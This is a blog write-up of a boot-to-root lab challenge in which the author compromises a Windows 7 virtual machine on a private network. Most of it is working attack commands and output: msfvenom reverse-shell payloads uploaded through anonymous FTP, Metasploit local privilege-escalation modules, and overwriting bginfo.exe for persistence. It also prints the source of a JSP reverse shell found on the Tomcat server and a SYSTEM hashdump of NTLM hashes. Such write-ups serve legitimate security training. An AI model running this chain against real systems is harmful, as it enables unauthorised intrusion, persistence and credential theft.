---
layout: post
title: "Boot to Root"
date: "2018-08-10 20:24:48"
comments: false
categories:
- hacking
tags:
- offensive
- cno
---

Some fun I hacking on a *boot to root* challenge I did with a mate recently.


# Enumeration

### OS Fingerprint

    root@kali:~/boot2root# nmap -O 192.168.0.102
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-26 22:44 EDT
    Nmap scan report for 192.168.0.102
    Host is up (0.00022s latency).
    Not shown: 986 closed ports
    PORT      STATE SERVICE
    21/tcp    open  ftp
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    8009/tcp  open  ajp13
    8080/tcp  open  http-proxy
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49157/tcp open  unknown
    MAC Address: 00:50:56:A3:B7:92 (VMware)
    Device type: general purpose
    Running: Microsoft Windows 2008|Vista|7
    OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_vista::sp1:home_premium     cpe:/o:microsoft:windows_7
    OS details: Microsoft Windows Server 2008 R2 SP1, Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows     Server 2008
    Network Distance: 1 hop
    
    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 66.26 seconds

A Windows box, running a bunch of services like `ftp`, two `http` servers, `smb` and `ajp`.

> AJP is a wire protocol. It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible, but proxy the request to Tomcat for Tomcat related content.


### What services are running?

    root@kali:~# nmap -A -sV 192.168.0.102
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-26 22:44 EDT
    Nmap scan report for 192.168.0.102
    Host is up (0.00026s latency).
    Not shown: 986 closed ports
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           FileZilla ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | drwxr-xr-x 1 ftp ftp              0 Nov 13  2017 aspnet_client
    | -rw-r--r-- 1 ftp ftp             89 Nov 13  2017 hello.aspx
    |_-rw-r--r-- 1 ftp ftp             96 Nov 13  2017 index.html
    |_ftp-bounce: bounce working!
    | ftp-syst: 
    |_  SYST: UNIX emulated by FileZilla
    80/tcp    open  http          Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: Site doesn't have a title (text/html).
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds  Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  open  ms-wbt-server Microsoft Terminal Service
    | ssl-cert: Subject: commonName=IE11Win7
    | Not valid before: 2018-06-14T00:58:43
    |_Not valid after:  2018-12-14T00:58:43
    |_ssl-date: 2018-07-27T02:46:09+00:00; -42s from scanner time.
    8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8080/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat/7.0.82
    49152/tcp open  msrpc         Microsoft Windows RPC
    49153/tcp open  msrpc         Microsoft Windows RPC
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49156/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  msrpc         Microsoft Windows RPC
    MAC Address: 00:50:56:A3:B7:92 (VMware)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.60%E=4%D=7/26%OT=21%CT=1%CU=31080%PV=Y%DS=1%DC=D%G=Y%M=005056%T
    OS:M=5B5A87B4%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10D%TI=I%CI=I%TS=7
    OS:)OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B
    OS:4NW8ST11%O6=M5B4ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
    OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
    OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
    OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
    OS:=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
    OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
    
    Network Distance: 1 hop
    Service Info: Host: IE11WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: -51s, deviation: 13s, median: -1m01s
    |_nbstat: NetBIOS name: IE11WIN7, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:a3:b7:92 (VMware)
    | smb-os-discovery: 
    |   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1
    |   Computer name: IE11Win7
    |   NetBIOS computer name: IE11WIN7\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2018-07-26T19:46:09-07:00
    | smb-security-mode: 
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2018-07-26 22:46:10
    |_  start_date: 2018-07-26 18:36:58
    
    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.26 ms 192.168.0.102
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 148.76 seconds




### Vulnerabilities scan Results

    root@kali:~/boot2root# nmap --script vuln 192.168.0.102
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-26 22:44 EDT
    Nmap scan report for 192.168.0.102
    Host is up (0.00018s latency).
    Not shown: 986 closed ports
    PORT      STATE SERVICE
    21/tcp    open  ftp
    |_sslv2-drown: 
    80/tcp    open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    | ssl-dh-params: 
    |   VULNERABLE:
    |   Diffie-Hellman Key Exchange Insufficient Group Strength
    |     State: VULNERABLE
    |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
    |       of insufficient strength, especially those using one of a few commonly
    |       shared groups, may be susceptible to passive eavesdropping attacks.
    |     Check results:
    |       WEAK DH GROUP 1
    |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    |             Modulus Type: Safe prime
    |             Modulus Source: RFC2409/Oakley Group 2
    |             Modulus Length: 1024
    |             Generator Length: 1024
    |             Public Key Length: 1024
    |     References:
    |_      https://weakdh.org
    |_sslv2-drown: 
    8009/tcp  open  ajp13
    8080/tcp  open  http-proxy
    | http-enum: 
    |   /examples/: Sample scripts
    |   /manager/html/upload: Apache Tomcat (401 Unauthorized)
    |   /manager/html: Apache Tomcat (401 Unauthorized)
    |_  /docs/: Potentially interesting folder
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49157/tcp open  unknown
    MAC Address: 00:50:56:A3:B7:92 (VMware)
    
    Host script results:
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    
    Nmap done: 1 IP address (1 host up) scanned in 201.12 seconds


Damn, no remote code execution vulnerablities, but lots of services to dig into.



# Exploitation

### Anonymous FTP - test login

    root@kali:~/boot2root# ftp 192.168.0.102
    Connected to 192.168.0.102.
    220-FileZilla Server 0.9.60 beta
    220-written by Tim Kosse (tim.kosse@filezilla-project.org)
    220 Please visit https://filezilla-project.org/
    Name (192.168.0.102:root): anonymous
    331 Password required for anonymous
    Password:
    230 Logged on


### Whats on the FTP server?

    ftp> ls
    200 Port command successful
    150 Opening data channel for directory listing of "/"
    drwxr-xr-x 1 ftp ftp              0 Nov 13  2017 aspnet_client
    -rw-r--r-- 1 ftp ftp             89 Nov 13  2017 hello.aspx
    -rw-r--r-- 1 ftp ftp             96 Nov 13  2017 index.html


### ASP.NET probe

It looks like the web server (IIS on Windows) is configured to run aspx (ASP.NET) server side code. Verify this by visiting [http:192.168.0.102/hello.aspx](#) in a browser. Confirmed.


### Create an ASPX reverse shell payload using MSFVenom

    root@kali:~/boot2root# msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=192.168.0.99 LPORT=4444 -o     rshell.aspx
    No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    No Arch selected, selecting Arch: x86 from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 333 bytes
    Final size of aspx file: 2773 bytes
    Saved as: rshell.aspx


### Upload payload via anon FTP

    root@kali:~/boot2root# ftp 192.168.0.102
    Connected to 192.168.0.102.
    220-FileZilla Server 0.9.60 beta
    220-written by Tim Kosse (tim.kosse@filezilla-project.org)
    220 Please visit https://filezilla-project.org/
    Name (192.168.0.102:root): anonymous
    331 Password required for anonymous
    Password:
    230 Logged on
    Remote system type is UNIX.
    ftp> lcd ~/boot2root
    Local directory now /root/boot2root
    ftp> put rshell.aspx
    local: rshell.aspx remote: rshell.aspx
    200 Port command successful
    150 Opening data channel for file upload to server of "/rshell.aspx"
    226 Successfully transferred "/rshell.aspx"
    335 bytes sent in 0.00 secs (7.4298 MB/s)



### Setup a listener to catch the reverse shell on port 4444

    msf exploit(handler) > use exploit/multi/handler 
    msf exploit(handler) > options
    
    Module options (exploit/multi/handler):
    
       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------
    
    
    Payload options (windows/x64/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.0.99     yes       The listen address
       LPORT     7777             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Wildcard Target
    
    
    msf exploit(handler) > set LPORT 4444
    LPORT => 4444
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > options
    
    Module options (exploit/multi/handler):
    
       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.0.99     yes       The listen address
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Wildcard Target
    
    
    msf exploit(handler) > run
    
    [*] Exploit running as background job 5.
    
    [*] Started reverse TCP handler on 192.168.0.99:444
    Navigate to the remote payload in the browser by visiting http://192.168.0.102/rshell.aspx. This should activate     the reverse shell.
    msf exploit(handler) > 
    [*] Sending stage (179267 bytes) to 192.168.0.102
    [*] Meterpreter session 16 opened (192.168.0.99:4444 -> 192.168.0.102:49158) at 2018-07-26 23:17:38 -0400
    
    msf exploit(handler) > sessions
    
    Active sessions
    ===============
    
      Id  Type                     Information                         Connection
      --  ----                     -----------                         ----------
      16  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:4444 -> 192.168.0.102:49158     (192.168.0.102)
    
    msf exploit(handler) > sessions 16
    [*] Starting interaction with 16...
    
    meterpreter > ps
    
    Process List
    ============
    
     PID   PPID  Name                  Arch  Session  User                     Path
     ---   ----  ----                  ----  -------  ----                     ----
     0     0     [System Process]                                              
     4     0     System                                                        
     240   4     smss.exe                                                      
     336   328   csrss.exe                                                     
     388   328   wininit.exe                                                   
     396   380   csrss.exe                                                     
     444   380   winlogon.exe                                                  
     488   388   services.exe                                                  
     496   388   lsass.exe                                                     
     504   388   lsm.exe                                                       
     608   488   svchost.exe                                                   
     636   488   svchost.exe                                                   
     672   488   svchost.exe                                                   
     724   488   svchost.exe                                                   
     792   444   LogonUI.exe                                                   
     824   488   svchost.exe                                                   
     876   488   svchost.exe                                                   
     916   488   svchost.exe                                                   
     976   488   sppsvc.exe                                                    
     988   724   audiodg.exe           x86   0                                 
     1136  488   svchost.exe                                                   
     1248  488   spoolsv.exe                                                   
     1284  488   svchost.exe                                                   
     1356  488   vmicsvc.exe                                                   
     1376  488   vmicsvc.exe                                                   
     1404  488   vmicsvc.exe                                                   
     1444  488   vmicsvc.exe                                                   
     1472  488   vmicsvc.exe                                                   
     1500  488   svchost.exe                                                   
     1548  488   svchost.exe                                                   
     1664  488   FileZilla Server.exe                                          
     1736  488   Tomcat7.exe                                                   
     1764  336   conhost.exe                                                   
     1804  488   vmtoolsd.exe                                                  
     1836  488   svchost.exe                                                   
     1880  488   wlms.exe                                                      
     2248  608   WmiPrvSE.exe                                                  
     2436  488   dllhost.exe                                                   
     2488  488   dllhost.exe                                                   
     2580  488   msdtc.exe                                                     
     2708  488   VSSVC.exe                                                     
     2856  1836  w3wp.exe              x86   0        IIS APPPOOL\MyFirstSite  c:\windows\system32\inetsrv\w3wp.exe



### Create a binary native reverse shell with MSFVEnom

Prior experience shows that some meterpreter shells (particularly the web based ones like `php` and `aspx`) are less functional than their native OS binary equivalents, accordingly, we deployed a second access method using a meterpreter in a exe package.

    root@kali:~/boot2root# msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=192.168.0.99 LPORT=4444 -o rshell.exe
    No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    No Arch selected, selecting Arch: x86 from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 333 bytes
    Final size of exe file: 73802 bytes
    Saved as: rshell.exe


### Upload it through the ASP.NET shell

    meterpreter > lcd /root/boot2root
    meterpreter > upload rshell.exe
    [*] uploading  : rshell.exe -> rshell.exe
    [*] uploaded   : rshell.exe -> rshell.exe


### Run it on the host

    meterpreter > shell
    Process 4052 created.
    Channel 2 created.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    c:\Test>dir
    dir
     Volume in drive C has no label.
     Volume Serial Number is E0CE-337D
    
     Directory of c:\Test
    
    07/26/2018  08:19 PM    <DIR>          .
    07/26/2018  08:19 PM    <DIR>          ..
    11/13/2017  10:38 PM    <DIR>          New folder
    07/26/2018  08:19 PM               333 rshell.exe
                   1 File(s)            333 bytes
                   3 Dir(s)  122,943,504,384 bytes free
    
    c:\Test>rshell.exe
    rshell.exe
    
    c:\test>rshell.exe
    
    [*] Sending stage (179267 bytes) to 192.168.0.102
    rshell.exe
    
    c:\test>[*] Meterpreter session 17 opened (192.168.0.99:4444 -> 192.168.0.102:49159) at 2018-07-26 23:25:03 -0400


### Connect the new session 

Background the ASP.NET remote shell session, and connect to the *new* (session 17) Windows binary native session:

    meterpreter > background
    [*] Backgrounding session 16...
    msf exploit(handler) > sessions
    
    Active sessions
    ===============
    
      Id  Type                     Information                         Connection
      --  ----                     -----------                         ----------
      16  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:4444 -> 192.168.0.102:49158 (192.168.0.102)
      17  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:4444 -> 192.168.0.102:49159 (192.168.0.102)



### Attempt privilege Escalation 

Try out some local privesc exploits.

    msf exploit(handler) > use exploit/windows/local/ms13_053_schlamperei 
    msf exploit(ms13_053_schlamperei) > set SESSION 17
    SESSION => 17
    msf exploit(ms13_053_schlamperei) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(ms13_053_schlamperei) > set LHOST 192.168.0.99
    LHOST => 192.168.0.99
    msf exploit(ms13_053_schlamperei) > options
    
    Module options (exploit/windows/local/ms13_053_schlamperei):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION  17               yes       The session to run this module on.
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.0.99     yes       The listen address
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 7 SP0/SP1
    
    msf exploit(ms13_053_schlamperei) > set LPORT 5555
    LPORT => 5555
    msf exploit(ms13_053_schlamperei) > run
    
    [*] Started reverse TCP handler on 192.168.0.99:5555 
    [-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system
    [*] Exploit completed, but no session was created.


Failed to work @ 14:11. Time to pivot, lets take MS10-015 for a spin.


    msf exploit(ms14_058_track_popup_menu) > use exploit/windows/local/ms10_015_kitrap0d 
    msf exploit(ms10_015_kitrap0d) > options
    
    Module options (exploit/windows/local/ms10_015_kitrap0d):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION                   yes       The session to run this module on.
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 2K SP4 - Windows 7 (x86)
    
    
    msf exploit(ms10_015_kitrap0d) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(ms10_015_kitrap0d) > options
    
    Module options (exploit/windows/local/ms10_015_kitrap0d):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION                   yes       The session to run this module on.
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST                      yes       The listen address
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows 2K SP4 - Windows 7 (x86)
    
    
    msf exploit(ms10_015_kitrap0d) > set LHOST 192.168.0.99
    LHOST => 192.168.0.99
    msf exploit(ms10_015_kitrap0d) > set LPORT 5555
    LPORT => 5555
    msf exploit(ms10_015_kitrap0d) > set SESSION 16
    SESSION => 16
    msf exploit(ms10_015_kitrap0d) > run
    
    [-] Exploit failed: Msf::OptionValidateError The following options failed to validate: SESSION.
    [*] Exploit completed, but no session was created.

    msf exploit(ms10_015_kitrap0d) > sessions
    Active sessions
    ===============
    
      Id  Type                     Information                         Connection
      --  ----                     -----------                         ----------
      17  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:4444 -> 192.168.0.102:49159 (192.168.0.102)
      18  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:5555 -> 192.168.0.102:49160 (192.168.0.102)
    
    msf exploit(ms10_015_kitrap0d) > set SESSION 17
    SESSION => 17
    msf exploit(ms10_015_kitrap0d) > run
    
    [*] Started reverse TCP handler on 192.168.0.99:5555 
    [*] Launching notepad to host the exploit...
    [+] Process 4056 launched.
    [*] Reflectively injecting the exploit DLL into 4056...
    [*] Injecting exploit into 4056 ...
    [*] Exploit injected. Injecting payload into 4056...
    [*] Payload injected. Executing exploit...
    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
    [*] Exploit completed, but no session was created.

    
Failed to work @ 14:14. The machine appears to be fairly well patched. OK, quickly try out another MS14-058.


    msf exploit(ms13_081_track_popup_menu) > use exploit/windows/local/ms14_058_track_popup_menu
    msf exploit(ms14_058_track_popup_menu) > options
    
    Module options (exploit/windows/local/ms14_058_track_popup_menu):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION  17               yes       The session to run this module on.
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.0.99     yes       The listen address
       LPORT     5555             yes       The listen port
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows x86
    
    msf exploit(ms14_058_track_popup_menu) > run
    
    [*] Started reverse TCP handler on 192.168.0.99:5555 
    [*] Launching notepad to host the exploit...
    [+] Process 912 launched.
    [*] Reflectively injecting the exploit DLL into 912...
    [*] Injecting exploit into 912...
    [*] Exploit injected. Injecting payload into 912...
    [*] Payload injected. Executing exploit...
    [*] Sending stage (179267 bytes) to 192.168.0.102
    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
    [*] Meterpreter session 20 opened (192.168.0.99:5555 -> 192.168.0.102:49162) at 2018-07-26 23:47:00 -0400
    
    meterpreter > getuid
    Server username: IIS APPPOOL\MyFirstSite
    meterpreter > getsystem
    [-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
    [-] Named Pipe Impersonation (In Memory/Admin)
    [-] Named Pipe Impersonation (Dropper/Admin)
    [-] Token Duplication (In Memory/Admin)
    meterpreter > background
    [*] Backgrounding session 20...
    msf exploit(ms14_058_track_popup_menu) > sessions
    
    Active sessions
    ===============
    
      Id  Type                     Information                         Connection
      --  ----                     -----------                         ----------
      17  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:4444 -> 192.168.0.102:49159 (192.168.0.102)
      18  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:5555 -> 192.168.0.102:49160 (192.168.0.102)
      19  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:5555 -> 192.168.0.102:49161 (192.168.0.102)
      20  meterpreter x86/windows  IIS APPPOOL\MyFirstSite @ IE11WIN7  192.168.0.99:5555 -> 192.168.0.102:49162 (192.168.0.102)
    
    msf exploit(ms14_058_track_popup_menu) > sessions 20
    [*] Starting interaction with 20...
    
    meterpreter > getuid
    Server username: IIS APPPOOL\MyFirstSite

Failed to work @ 14:22. 

OK, more enumeration.

    meterpreter > sysinfo
    Computer        : IE11WIN7
    OS              : Windows 7 (Build 7601, Service Pack 1).
    Architecture    : x86
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 0
    Meterpreter     : x86/windows


### Persistence (possibly)

Overwrote `bginfo.exe` with a meterpreter executable to possible give us a new connection on a BGinfo run. Failed to trigger during the observation period, including after a reboot of the box.


### Privilege Elevation Tomcat

From the enumeration, noticed tomcat is running on 8080. In the low priv shell, find where this is setup.

    meterpreter > search -f *tomcat*
    Found 43 results...
        c:\Program Files\Apache Software Foundation\Tomcat 7.0\bin\tomcat-juli.jar (44739 bytes)
        c:\Program Files\Apache Software Foundation\Tomcat 7.0\bin\Tomcat7.exe (86656 bytes)
        c:\Program Files\Apache Software Foundation\Tomcat 7.0\bin\Tomcat7w.exe (110208 bytes)
        ...

Have a look around.

    meterpreter > cd /Program\ Files/Apache\ Software\ Foundation/Tomcat\ 7.0/webapps
    meterpreter > ls
    Listing: c:\Program Files\Apache Software Foundation\Tomcat 7.0\webapps
    =======================================================================
    
    Mode              Size   Type  Last modified              Name
    ----              ----   ----  -------------              ----
    40777/rwxrwxrwx   4096   dir   2017-11-14 00:15:05 -0500  ROOT
    40777/rwxrwxrwx   16384  dir   2017-11-14 00:15:06 -0500  docs
    40777/rwxrwxrwx   4096   dir   2017-11-14 00:15:06 -0500  examples
    40777/rwxrwxrwx   0      dir   2017-11-14 00:15:06 -0500  host-manager
    40777/rwxrwxrwx   0      dir   2017-11-14 00:15:06 -0500  manager
    40777/rwxrwxrwx   0      dir   2018-02-06 18:41:29 -0500  shell
    100666/rw-rw-rw-  1087   fil   2018-02-06 18:41:29 -0500  shell.war

wtf!? `shell.war`?

Unpack `shell.war` (which is simply a gzip). Browse the source code in `shell/swbjeakb.jsp`.

    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
      ShellPath = new String("/bin/sh");
    } else {
      ShellPath = new String("cmd.exe");
    }
    
        Socket socket = new Socket( "192.168.0.99", 4445 );
        Process process = Runtime.getRuntime().exec( ShellPath );
        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();


The payload appears to be starting a straight (i.e. non meterpreter) reverse shell, to 192.168.0.99 on port 4445. Lets try and catch that using netcat.

    nc -nvlp 4445

Now in a browser, hit the tomcat server and file by navigating to [http://192.168.0.102:8080/shell/](#)



### SYSTEM (root) privileges acheived

Boom! 14:37 on 2018-07-27 root shell timestamp.


### Transition to root meterpreter session and grab credentials


In the root netcat session, browse to `C:\Test` where the native Windows meterpreter payload binary `rshell.exe` was uploaded. Run that under the context of the SYSTEM account.

    [*] Sending stage (179267 bytes) to 192.168.0.102
    [*] Meterpreter session 22 opened (192.168.0.99:4444 -> 192.168.0.102:49167) at 2018-07-27 00:05:01 -0400
    
    
    msf exploit(handler) > sessions 23
    [*] Starting interaction with 23...
    
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    
    meterpreter > hashdump 
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    IEUser:1000:aad3b435b51404eeaad3b435b51404ee:888e46c1cae5cd127519b7b914f018ee:::
    
    meterpreter > shell
    Process 2540 created.
    Channel 1 created.
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Test>time
    time
    The current time is: 21:06:21.90
    Enter the new time: 
    
    
    C:\Test>exit
    exit
    meterpreter > 

